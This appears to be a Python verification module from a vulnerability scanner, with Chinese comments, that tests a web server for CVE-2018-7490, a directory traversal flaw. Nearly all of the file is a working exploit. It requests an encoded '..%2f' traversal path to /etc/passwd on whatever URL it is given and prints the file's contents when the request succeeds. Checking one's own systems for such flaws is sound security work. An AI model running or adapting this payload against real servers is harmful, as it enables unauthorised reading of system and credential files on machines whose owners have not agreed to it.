#!/usr/bin/env python3

'''
name: CVE-2018-7490漏洞
description: CVE-2018-7490漏洞可穿越目录查看其他文件
'''

from app.lib.utils.request import request


class CVE_2018_7490_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.headers = {
            'User-Agent': "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36 115Browser/6.0.3",
            'Content-Type': "application/x-www-form-urlencoded",
            'Connection': "keep-alive",
        }

    def run(self):
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        url = self.url + '/..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd'
        try:
            res = request.get(url, headers = self.headers)
            if res.status_code == 200 :
                print('存在CVE-2018-7490漏洞,穿越目录成功，查看的/etc/passwd文件内容是:\n',res.content.decode('utf-8'))
                return True
            else:
                print('不存在CVE-2018-7490漏洞')
                return False
        except Exception as e:
            print(e)
            return False
        finally:
            pass

if  __name__ == "__main__":
    CVE_2018_7490 = CVE_2018_7490_BaseVerify('http://127.0.0.1:8080')
    CVE_2018_7490.run()